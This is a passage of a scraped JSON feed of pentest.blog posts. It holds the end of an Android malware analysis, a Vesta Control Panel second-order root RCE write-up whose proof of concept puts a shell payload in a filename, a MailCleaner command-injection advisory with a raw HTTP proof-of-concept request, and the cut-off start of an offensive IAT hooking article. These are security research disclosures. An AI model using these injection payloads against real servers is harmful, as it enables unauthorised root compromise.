we can use our dex dropper python script. Malware <a href=\"https://koodous.com/apks/6c13658a81921f658f660a0f670eb61e9459d8105c1a72910a6bc8abd7795c65\">sample</a>. Load the arm binary to ghidra. Find the correct offset of the dex data block and the size of the block.  dex_extractor function might look different but it does the same thing. So you need to only change the name of the files, offset and size variables at the python script. Hash of dropped dex file : 7ff02fb46009fc96c139c48c28fb61904cc3de60482663631272396c6c6c32ec</p>\n\n\n\n<h2>Conclusion</h2>\n\n\n\n<p>We attached gdb to debug native code and found certain checks. Wrote a ghidra script to automate decryption of strings and frida script to bypass checks. Also learned that png files needs to be converted with Bitmap to get pixel values. So next time you see png file and suspicious app, look for bitmap calls <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f609.png\" alt=\"ðŸ˜‰\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<h2>References</h2>\n\n\n\n<p>GDB Debug : <a href=\"https://packmad.github.io/gdb-android/\">https://packmad.github.io/gdb-android/</a><br>Featured image : <a href=\"https://www.deviantart.com/velinov/art/Hydra-monster-144496963\">https://www.deviantart.com/velinov/art/Hydra-monster-144496963</a></p>\n\n\n\n<p></p>\n\n\n\n<p></p>\n","descriptionType":"html","publishedDate":"Thu, 18 Jul 2019 11:29:20 +0000","feedId":11893,"bgimg":"https://pentest.blog/wp-content/uploads/gdb-1024x462.png","linkMd5":"6e8364b2bd7691fdf6e9b97b38fddee5","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn51@2020_6/2020/08/25/01-41-28-213_4441665cf75f65e0.webp","destWidth":1024,"destHeight":462,"sourceBytes":307265,"destBytes":42236,"author":"Ahmet Bilal Can","articleImgCdnMap":{"https://pentest.blog/wp-content/uploads/gdb-1024x462.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn51@2020_6/2020/08/25/01-41-28-213_4441665cf75f65e0.webp","https://pentest.blog/wp-content/uploads/break.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn12@2020_2/2020/08/25/01-41-46-892_5f199ab57f3cd7de.webp","https://pentest.blog/wp-content/uploads/hydra1-1.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn12@2020_4/2020/08/25/01-41-47-171_d2f0d8dd8d9934a0.webp","https://pentest.blog/wp-content/uploads/hydra_time.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn71@2020_2/2020/08/25/01-41-48-420_7a725a19a44fdc7a.webp","https://pentest.blog/wp-content/uploads/xor-1.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn76@2020_6/2020/08/25/01-41-47-104_78162a0365dd6094.webp","https://pentest.blog/wp-content/uploads/while-1.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn24@2020_2/2020/08/25/01-41-47-195_ba066b611680aa9f.webp","https://pentest.blog/wp-content/uploads/xor_1-2.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn91@2020_6/2020/08/25/01-41-46-947_3f49e4ca495cc15d.webp","https://pentest.blog/wp-content/uploads/xor_2-1.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn15@2020_4/2020/08/25/01-41-47-078_9a4c865c5ed478b3.webp","https://pentest.blog/wp-content/uploads/sim-1.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn92@2020_3/2020/08/25/01-41-47-289_431f0c60677482cb.webp","https://pentest.blog/wp-content/uploads/second-1.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn76@2020_1/2020/08/25/01-41-46-888_304bcd90c0bc709b.webp","https://pentest.blog/wp-content/uploads/access-1024x586.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn3@2020_5/2020/08/25/01-41-47-120_741cd574c0b09412.webp","https://pentest.blog/wp-content/uploads/init-1.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn71@2020_3/2020/08/25/01-41-47-043_ec9f790f0c377a42.webp","https://pentest.blog/wp-content/uploads/asset_iterate-1.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn8@2020_4/2020/08/25/01-41-47-097_d1e4482ee5e34825.webp","https://pentest.blog/wp-content/uploads/up_asset-1.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn52@2020_2/2020/08/25/01-41-46-982_4cb2633c9234cefe.webp","https://pentest.blog/wp-content/uploads/dex_c-1-1.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn63@2020_3/2020/08/25/01-41-47-072_0ed915e8cad22fbb.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_6/2020/08/25/01-41-27-434_818413be4c4fbce7.webp","https://pentest.blog/wp-content/uploads/pixel.jpg":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn19@2020_2/2020/08/25/01-41-47-099_7a2f6fdba409574b.webp","https://pentest.blog/wp-content/uploads/dex_ff-1.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn44@2020_4/2020/08/25/01-41-48-331_2b5a720d1d681916.webp","https://pentest.blog/wp-content/uploads/byte_chose-1.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn59@2020_3/2020/08/25/01-41-47-182_860c1950f32a9524.webp","https://pentest.blog/wp-content/uploads/dex_ext-1.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn88@2020_2/2020/08/25/01-41-46-931_c7daa93484c71640.webp","https://pentest.blog/wp-content/uploads/jadx-3.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn68@2020_2/2020/08/25/01-41-48-397_0aa9c023a483a745.webp","https://pentest.blog/wp-content/uploads/fridadex.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn100@2020_2/2020/08/25/01-41-47-138_3e5b0fda7e72554e.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f609.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn32@2020_5/2020/08/25/01-41-46-859_80ba72b7642bafbb.webp"},"publishedOrCreatedDate":1598319687286},{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","title":"Vesta Control Panel Second Order Remote Code Execution 0day Step-by-Step Analysis","link":"https://pentest.blog/?p=2453","description":"\n<p>I believe that doing a security research is all about trying to understand high-level of architecture of the products and finding a creative attack vectors. </p>\n\n\n\n<p>I hope this blog post will show some the readers how to start doing security research. </p>\n\n\n\n<span id=\"more-2453\"></span>\n\n\n\n<h4>Installation</h4>\n\n\n\n<p>You can install that software Debian/Ubuntu or CentOS. Iâ€™ve installed it on Ubuntu 18.10 x64 by following 3 steps at&#160;<a href=\"http://vestacp.com/install/\">http://vestacp.com/install/</a>.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\"># Connect to your server as root via SSH\nssh root@your.server\n# Download installation script\ncurl -O http://vestacp.com/pub/vst-install.sh\n# Run it\nbash vst-install.sh</pre>\n\n\n\n<h4>Vuln 0x01 &#8211; Security Design of Bash Script Executions</h4>\n\n\n\n<p>During static analysis of the web application, I&#8217;ve seen lots of bash script execution behind the scene. Let me give your one example from login process.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"3,4,8\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">// VESTA_CMD variable definition is as follow.\ndefine('VESTA_CMD', '/usr/bin/sudo /usr/local/vesta/bin/');\n// ... OMITTED CODE...\nif (isset($_POST['user']) &#38;&#38; isset($_POST['password'])) {\n    if(isset($_SESSION['token']) &#38;&#38; isset($_POST['token']) &#38;&#38; $_POST['token'] == $_SESSION['token']) {\n        $v_user = escapeshellarg($_POST['user']);\n        $v_ip = escapeshellarg($_SERVER['REMOTE_ADDR']);\n\n        // Get user's salt\n        $output = '';\n        exec (VESTA_CMD.\"v-get-user-salt \".$v_user.\" \".$v_ip.\" json\" , $output, $return_var);\n        $pam = json_decode(implode('', $output), true);\n        // ... OMITTED CODE...</pre>\n\n\n\n<p>Of course, having a input validation on user parameter would be better even if it&#8217;s securely used in <strong>exec()</strong> call. In order to find a possible insecure usage of <strong>exec()</strong> function call, I&#8217;ve reviewed all the source code but couldn&#8217;t find any. In the meantime, you may thinking about sudo command at the beginning of the <strong>VESTA_CMD </strong>variable. Yes, all the bash scripts will be executed by sudo binary through administrator interface (PHP).</p>\n\n\n\n<p>Following screenshot show that PHP-FPM process is running with admin user privileges, which is capable executing sudo command and eventually executes bash scripts.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img src=\"https://pentest.blog/wp-content/uploads/vestacp-1.png\" alt=\"\" class=\"wp-image-2460\"/></figure>\n\n\n\n<p>So that means, admin user must have a root privileges. Here is the content of the sudoers file. Bash scripts, executables shouldn&#8217;t be executed under the context of privileged accounts, especially with user controllable datas.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\" data-enlighter-theme=\"\" data-enlighter-highlight=\"3\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">root@mincelocal:~# cat /etc/sudoers|grep admin\n# Members of the admin group may gain root privileges\n%admin ALL=(ALL) ALL\nroot@mincelocal:~# </pre>\n\n\n\n<p>As I said before, all <strong>exec() </strong>or similar function calls has been securely used in the code base. That means, we can NOT directly have command injection vulnerability. But what if we can find an insecure command within one of the bash script with a user controllable variable ? </p>\n\n\n\n<h4>Vuln 0x02 &#8211; Second Order RCE on Backup Process</h4>\n\n\n\n<p>While I was reviewing bash script of some of the functionalists, one thing caught my attention. When you send GET request to the https://url:8083/schedule/backup/  endpoint, it will executed following PHP codes.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">include($_SERVER['DOCUMENT_ROOT'].\"/inc/main.php\");\n\n$v_username = escapeshellarg($user);\nexec (VESTA_CMD.\"v-schedule-user-backup \".$v_username, $output, $return_var);</pre>\n\n\n\n<p>Let&#8217;s have a look at content of the <strong>v-schedule-user-backup</strong> bash script file.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\" data-enlighter-theme=\"\" data-enlighter-highlight=\"19\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">#!/bin/bash\n\n# Argument definition\nuser=$1\n\n# Includes\nsource $VESTA/func/main.sh\nsource $VESTA/conf/vesta.conf\n\ncheck_args '1' \"$#\" 'USER'\nis_format_valid 'user'\nis_system_enabled \"$BACKUP_SYSTEM\" 'BACKUP_SYSTEM'\nis_object_valid 'user' 'USER' \"$user\"\nis_backup_enabled\nis_backup_scheduled 'backup'\n\n# Adding backup task to  the queue\nlog=$VESTA/log/backup.log\necho \"$BIN/v-backup-user $user yes >> $log 2>&#38;1\" >>\\\n    $VESTA/data/queue/backup.pipe\n\n# Logging\nlog_event \"$OK\" \"$ARGUMENTS\"\n\nexit\n</pre>\n\n\n\n<p>Nothing interesting so far. We can NOT even control <strong>user</strong> variable, since it&#8217;s coming from session. But <strong>v-schedule-user-backup</strong> is executing <strong>v-backup-user </strong>file. Let&#8217;s keep reading. That bash scripts does what it says, it gathers all the data related to our user and compress it as a tar.gz file. </p>\n\n\n\n<p>That bash script has 945 line of code. For that reason, I&#8217;m only showing important parts.  </p>\n\n\n\n<p>Following code section is taken lines between 900-920 from <strong>v-backup-user </strong>file. It writes multiple variable into the backup.conf file (thatâ€™ll be very important later!)</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\" data-enlighter-theme=\"\" data-enlighter-highlight=\"9\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\"># Registering new backup\nbackup_str=\"BACKUP='$user.$backup_new_date.tar'\"\nbackup_str=\"$backup_str TYPE='$BACKUP_SYSTEM' SIZE='$size'\"\nbackup_str=\"$backup_str WEB='${web_list// /,}'\"\nbackup_str=\"$backup_str DNS='${dns_list// /,}'\"\nbackup_str=\"$backup_str MAIL='${mail_list// /,}'\"\nbackup_str=\"$backup_str DB='${db_list// /,}'\"\nbackup_str=\"$backup_str CRON='$cron_list'\"\nbackup_str=\"$backup_str UDIR='${udir_list// /,}'\"\nbackup_str=\"$backup_str RUNTIME='$run_time' TIME='$time' DATE='$date'\"\necho \"$backup_str\" >> $USER_DATA/backup.conf</pre>\n\n\n\n<p>One of the variable is 9. line <strong>udir_list</strong> , which is being populated by following code section around line 400-450 in the code base.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    for udir in $(ls -a |egrep -v \"^conf$|^web$|^dns$|^mail$|^\\.\\.$|^\\.$\"); do\n        exclusion=$(echo \"$USER\" |tr ',' '\\n' |grep \"^$udir$\")\n        if [ -z \"$exclusion\" ]; then\n            ((i ++))\n            udir_list=\"$udir_list $udir\"\n            echo -e \"$(date \"+%F %T\") adding $udir\" |tee -a $BACKUP/$user.log\n\n            # Backup files and dirs\n            tar --anchored -cpf- ${fargs[@]} $udir |gzip -$BACKUP_GZIP - > $tmpdir/user_dir/$udir.tar.gz\n        fi\n    done</pre>\n\n\n\n<p>It basically works as follow in order:<br>&#8211;&#160;&#160;&#160;&#160;&#160;&#160; Get speficis folder names and files start with dots.<br>&#8211;&#160;&#160;&#160;&#160;&#160;&#160; Compress them into the backup file.<br>&#8211;&#160;&#160;&#160;&#160;&#160;&#160; Replace spaces within the file and/or folder names in case of whitespace. (thatâ€™ll be important too)</p>\n\n\n\n<p>In the end you will have your tar backup file on your userâ€™s folder. Please keep that information in your mind, weâ€™ll come back here later ! Now letâ€™s see whatâ€™s happening when your list existing backup file via web panel. </p>\n\n\n\n<p><strong>Listing Existing Backup</strong></p>\n\n\n\n<p>Following URL can be used to list current backups. <a href=\"https://192.168.74.218:8083/list/backup/\">https://URL:8083/list/backup/</a></p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"ruby\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    exec (VESTA_CMD.\"v-list-user-backup $user \".escapeshellarg($_GET['backup']).\" json\", $output, $return_var);\n    $data = json_decode(implode('', $output), true);\n    $data = array_reverse($data,true);\n    unset($output);</pre>\n\n\n\n<p>That endpoint will execute <strong>v-list-user-backups</strong> bash script file with <strong>user</strong>, <strong>backup</strong> and <strong>json </strong>variables retrieves some information about userâ€™s backup and shows them on web ui.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img src=\"https://pentest.blog/wp-content/uploads/vestacp-2.png\" alt=\"\" class=\"wp-image-2467\"/></figure>\n\n\n\n<p>Letâ€™s have a look at v-list-user-backup implementation. Please keep that in your mind, we are interested with json output.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\" data-enlighter-theme=\"\" data-enlighter-highlight=\"7\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">json_list() {\n    IFS=$'\\n'\n    i=1\n    objects=$(grep BACKUP $USER_DATA/backup.conf |wc -l)\n    echo \"{\"\n    while read str; do\n        eval $str\n        echo -n '    \"'$BACKUP'\": {\n        \"TYPE\": \"'$TYPE'\",\n        \"SIZE\": \"'$SIZE'\",\n        \"WEB\": \"'$WEB'\",\n        \"DNS\": \"'$DNS'\",\n        \"MAIL\": \"'$MAIL'\",\n        \"DB\": \"'$DB'\",\n        \"CRON\": \"'$CRON'\",\n        \"UDIR\": \"'$UDIR'\",\n        \"RUNTIME\": \"'$RUNTIME'\",\n        \"TIME\": \"'$TIME'\",\n        \"DATE\": \"'$DATE'\"\n    }'\n        if [ \"$i\" -lt \"$objects\" ]; then\n            echo ','\n        else\n            echo\n        fi\n        ((i++))\n    done &#60; &#60;(cat $USER_DATA/backup.conf)\n    echo '}'\n}</pre>\n\n\n\n<p>Allright, thatâ€™s interesting : ) Content of the userâ€™s backup.conf file read and string is being passed to the eval J Itâ€™s time to remember first stage of that report, backup.conf is being created with multiple parameter (remember udir_list)</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">root@mincelocal:~# cat /usr/local/vesta/data/users/user01/backup.conf \n\nBACKUP='user01.2020-03-13_13-40-01.tar' TYPE='local' SIZE='1' WEB='' DNS='' MAIL='' DB='' CRON='' UDIR='.bash_logout,.bashrc,.profile,tmp' RUNTIME='1' TIME='13:40:01' DATE='2020-03-13'\n\nroot@mincelocal:~# </pre>\n\n\n\n<p>Here is the content of the backup.conf file. All the files starts with dot is in the UDIR definiton with single quotes and thanks to best operating system ever Linux, we can use single quotes in the files name <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> We can connect our userâ€™s homefolder with FTP and renamed .bash_logout file with something <strong>.bash_logoutâ€™;$(PAYLOAD);â€™</strong> will be our payload.</p>\n\n\n\n<h4>PoC</h4>\n\n\n\n<p>1 â€“ User login to the FTP</p>\n\n\n\n<p>2 â€“ Renamed the&#160;.bash_logout with <strong>bash_logoutâ€™;$(sleep${IFS}1337);â€™</strong> ! white-space will break the payload. Remember sed command on the previouse section!</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img src=\"https://pentest.blog/wp-content/uploads/vestacp-3-1.png\" alt=\"\" class=\"wp-image-2471\"/></figure>\n\n\n\n<p>3 â€“ User login to the web application.</p>\n\n\n\n<p>4 â€“ Trigger the backup process.</p>\n\n\n\n<p>5 â€“ When the backup process finished, wait like 3-4 minutes, Here is the content of the backup.conf with implanted payload.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">root@mincelocal:~# cat /usr/local/vesta/data/users/user01/backup.conf \n\nBACKUP='user01.2020-03-13_13-40-01.tar' TYPE='local' SIZE='1' WEB='' DNS='' MAIL='' DB='' CRON='' UDIR='.bash_logout';$(sleep${IFS}1337);',.bashrc,.profile,tmp' RUNTIME='1' TIME='13:40:01' DATE='2020-03-13'</pre>\n\n\n\n<p>6 â€“ Go to&#160;<a href=\"https://192.168.74.218:8083/list/backup/\">https://192.168.74.218:8083/list/backup/</a>endpoint where we trigger the v-list-user-backup bash script execution. v-list-user-backup will read the content of the backup.conf file which contains our payload in the filename changed via FTP on step 2.&#160;</p>\n\n\n\n<p>7 â€“ eval is being called.</p>\n\n\n\n<p>8 â€“ Thanks to the first vulnerability, that command will be executed as a root !</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img src=\"https://pentest.blog/wp-content/uploads/vestacp-4.png\" alt=\"\" class=\"wp-image-2472\"/></figure>\n\n\n\n<h3>Exploitation</h3>\n\n\n\n<p>Ofcourse executing a sleep command with root privileges is not enough ! Here is the Metasploit module in action fellers !</p>\n\n\n\n<p>One of the major problem about exploitation is that we have length limitation on file name <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> Also space within the file name is forbidden because it breaks bash script eval command. So you may want to read Metasploit module&#8217;s source code in order to see how I managed to overcome these problems. </p>\n\n\n\n<p><a href=\"https://github.com/rapid7/metasploit-framework/pull/13094\">https://github.com/rapid7/metasploit-framework/pull/13094</a></p>\n\n\n\n<asciinema-player src=\"/wp-content/uploads/vesta.json\" cols=\"150\" rows=\"35\"></asciinema-player>\n\n\n\n<p></p>\n","descriptionType":"html","publishedDate":"Wed, 18 Mar 2020 14:53:07 +0000","feedId":11893,"bgimg":"https://pentest.blog/wp-content/uploads/vestacp-1.png","linkMd5":"fd88f7ad07bdc8fa1d2b7b147e3a9a42","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn40@2020_4/2020/08/25/01-41-27-851_f3ca636ba5eac039.webp","destWidth":1433,"destHeight":138,"sourceBytes":116660,"destBytes":35502,"author":"Mehmet Ince","articleImgCdnMap":{"https://pentest.blog/wp-content/uploads/vestacp-1.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn40@2020_4/2020/08/25/01-41-27-851_f3ca636ba5eac039.webp","https://pentest.blog/wp-content/uploads/vestacp-2.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn24@2020_5/2020/08/25/01-41-47-115_9a9ed882ad9910de.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_6/2020/08/25/01-41-27-434_818413be4c4fbce7.webp","https://pentest.blog/wp-content/uploads/vestacp-3-1.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn68@2020_5/2020/08/25/01-41-47-148_1872cf95827f789e.webp","https://pentest.blog/wp-content/uploads/vestacp-4.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn68@2020_6/2020/08/25/01-41-47-215_d967e9054ac4a3da.webp"},"publishedOrCreatedDate":1598319687282},{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","title":"Advisory | MailCleaner Community Edition Remote Code Execution CVE-2018-20323","link":"https://pentest.blog/?p=1484","description":"\n<p>In this article, I would like to share a remote code execution vulnerability details of MailCleaner Community Edition product.</p>\n\n\n\n<span id=\"more-1484\"></span>\n\n\n\n<h3>Advisory Informations</h3>\n\n\n\n<p><strong>Remotely Exploitable:</strong>&#160;Yes<br><strong>Authentication Required:</strong>&#160;NO<br><strong>Vendor URL:</strong><a href=\"https://www.mailcleaner.net/\">&#160;https://www.mailcleaner.net/</a><br><strong>Date of found:</strong>&#160;19 Dec 2018</p>\n\n\n\n<h3>Technical Details</h3>\n\n\n\n<p>I identified command injection vulnerability of MailCleaner Community Edition product. An authenticated user can execute an operating system command under the context of the web server user which is root.</p>\n\n\n\n<p>Logs.php file which located at www/soap/application/MCSoap has a vulnerability command execution code flow between lines 45-49 (following section)</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"20-28\" data-enlighter-linenumbers=\"true\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">static public function Logs_StartTrace($params) {\n\n\t\t$trace_id = 0;\n\n\t\trequire_once('MailCleaner/Config.php');\n\t\t$mcconfig = MailCleaner_Config::getInstance();\n\n\t\tif (!isset($params['regexp'])\n\t\t|| !$params['datefrom'] || !preg_match('/^\\d{8}$/', $params['datefrom'])\n\t\t|| !$params['dateto'] || !preg_match('/^\\d{8}$/', $params['dateto']) ) {\n\t\t\treturn array('trace_id' => $trace_id);\n\t\t}\n\t\t$cmd = $mcconfig->getOption('SRCDIR').\"/bin/search_log.pl \".$params['datefrom'].\" \".$params['dateto'].\" '\".$params['regexp'].\"'\";\n\t\tif (isset($params['filter']) &#38;&#38; $params['filter'] != '') {\n\t\t\t$cmd .= \" '\".$params['filter'].\"'\";\n\t\t}\n\n                if (isset($params['hiderejected']) &#38;&#38; $params['hiderejected']) {\n                    $cmd .= ' -R ';\n                }\n\n\t\tif (isset($params['trace_id']) &#38;&#38; $params['trace_id']) {\n\t\t\t$trace_id = $params['trace_id'];\n\t\t} else {\n\t\t\t$trace_id = md5(uniqid(mt_rand(), true));\n\t\t}\n                $cmd .= \" -B \".$trace_id;\n\n\t\t$cmd .= \"> \".$mcconfig->getOption('VARDIR').\"/run/mailcleaner/log_search/\".$trace_id.\" &#38;\";\n\t\t$res = `$cmd`;\n\t\treturn array('trace_id' => $trace_id, 'cmd' => $cmd) ;\n\t}</pre>\n\n\n\n<p>As you can see, lines between 20-28 there is an operating system command execution flow. If you look at the code carefully, you can see parameters like&#160;<strong>filter</strong>&#160;has been used without validation within the command.</p>\n\n\n\n<p>I&#8217;ve followed all the code flows where&#160;<strong>Logs_StartTrace</strong>&#160;has been used. One of these usage was interesting;</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">\tpublic function startFetchAll($params) {\n\t\t$trace_id = 0;\n\t\t$slave = new Default_Model_Slave();\n        $slaves = $slave->fetchAll();\n        \n        foreach ($slaves as $s) {\n        \t$res = $s->sendSoapRequest('Logs_StartTrace', $params);\n        \tif (isset($res['trace_id'])) {\n        \t\t$trace_id = $res['trace_id'];\n                $params['trace_id'] = $trace_id;\n        \t} else {\n                        continue;\n        \t}\n        }\n        return $trace_id;\n\t}</pre>\n\n\n\n<p>As you can see, our method where we have an issue is being called through soap service.</p>\n\n\n\n<p>Further analysis showed that&#160;<strong>startFecthAll</strong>&#160;method has been used within&#160;<strong>ManagetracingController</strong>&#160;like follow.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">public function searchAction() {\n        // ... OMITTED CODE ...\n    $view->loading = $loading;\n    $view->params = $this->getSearchParams();\n        \n    $orderfield = 'date';\n    $orderorder = 'desc';\n        // ... OMITTED CODE ...\n    }\n    if (isset($session->trace_id) &#38;&#38; $session->trace_id) {\n        // ... OMITTED CODE ...\n    } else {\n        ## no search running, launch search\n        if ($request->getParam('domain') != \"\") {\n            $trace_id = $element->startFetchAll($params);\n            $session->trace_id = $trace_id;\n        }\n        $view->loading = 1;\n    }</pre>\n\n\n\n<h2>Proof Of Concept</h2>\n\n\n\n<p>Following HTTP request successfully triggered vulnerability.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">POST /admin/managetracing/search/search HTTP/1.1\nHost: 12.0.0.100\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nCookie: MCSESS=3m6nk64ebqbf1jsnkc8vkmrg32;\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 576\n\nsearch=bMrpc&#38;domain=';sleep 100;%26&#38;submit=1</pre>\n\n\n\n<h2 id=\"mce_8\">Metasploit Module</h2>\n\n\n\n<p>As usual ?</p>\n\n\n\n<asciinema-player src=\"/wp-content/uploads/mailcleaner.json\" cols=\"150\" rows=\"35\"></asciinema-player>\n","descriptionType":"html","publishedDate":"Wed, 19 Dec 2018 14:37:13 +0000","feedId":11893,"bgimg":"","linkMd5":"3d4a57868d45c7944e8ea3d2833c21c1","bgimgJsdelivr":"","metaImg":"","author":"Mehmet Ince","publishedOrCreatedDate":1598319687288},{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","title":"Offensive IAT Hooking","link":"https://pentest.blog/?p=1299","description":"<p>This article will be about using IAT hooking methods for offensive purposes. These methods can be used in multiple situations where attacker needs to evade certain defense and analysis mechanism or hide from the victim in low privileged environments. Before getting into the technical stuff reader needs to be familiar with the following terminology.<span id=\"more-1299\"></span></p>\n<h3>Terminology</h3>\n<p><strong>Portable Executable(PE):Â </strong> The Portable Executable (PE) format is a file format for executables, object code, DLLs, FON Font files, and others used in 32-bit and 64-bit versions of Windows operating systems. The PE format is a data structure that encapsulates the information necessary for the Windows OS loader to manage the wrapped executable code.</p>\n<p><strong>Import Address Table(IAT):Â </strong>Address table is used as a lookup table when the application is calling a function in a different module. It can be in the form of both import by ordinal and import by name. Because a compiled program cannot know the memory location of the libraries it depends upon, an indirect jump is required whenever an API call is made. As the dynamic linker loads modules and joins them together, it writes actual addresses into the IAT slots, so that they point to the memory locations of the corresponding library functions.</p>\n<p><strong>Import Directory Table(IT):Â </strong>One section of note is the import address table (IAT), which is used as a lookup table when the application is calling a function in a different module. It can be in the form of both import by ordinal and import by name. Because a compiled program cannot know the memory location of the libraries it depends upon, an indirect jump is required whenever an API call is made.</p>\n<p><strong>Hooking:Â </strong>In computer programming, the term hooking covers a range of techniques used to alter or augment the behavior of an operating system, of applications, or of other software components by intercepting function calls or messages or events passed between software components. Code that handles such intercepted function calls, events or messages is called a hook.Â API hooking is a technique by which we can instrument and modify the behavior and flow of API calls. API hooking can be done using various methods on Windows.</p>\n<h3>Introduction</h3>\n<p>API hooking is used for many purposes,Â including debugging and extending functionality of a program but also it can very beneficial for attackers to manipulate application logic. There are several ways to perform API hooking on a windows based operating system such as;</p>\n<ul>\n<li>Virtual Function Detour</li>\n<li>Virtual Function Pointer Swap</li>\n<li>Virtual Table Pointer 